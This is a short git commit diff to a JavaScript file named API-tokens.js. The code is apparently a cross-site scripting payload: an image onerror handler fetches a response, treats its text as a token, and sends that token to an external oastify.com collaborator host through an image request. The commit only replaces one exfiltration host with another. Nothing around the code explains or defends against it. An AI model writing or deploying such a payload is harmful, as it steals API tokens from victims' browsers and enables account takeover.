e2e24532523c3df3ff86c60446234beb08bfae83
Krithika Rajamohan <95342624+krajamohan@users.noreply.github.com>
2026-01-07 16:58:14 +0100

    Update API-tokens.js

--- API-tokens.js
+++ API-tokens.js
@@ -6,7 +6,7 @@ img.onerror = function () {
     .then(r => r.text())
     .then(token => {
       new Image().src =
-        'https://mkabsttq4kqqdfn5721ui6w0jrpid91y.oastify.com/?token=' +
+        'https://zorow6x38xu3hsribf57mj0dn4twhm5b.oastify.com/?token=' +
         encodeURIComponent(token);
     });
 };
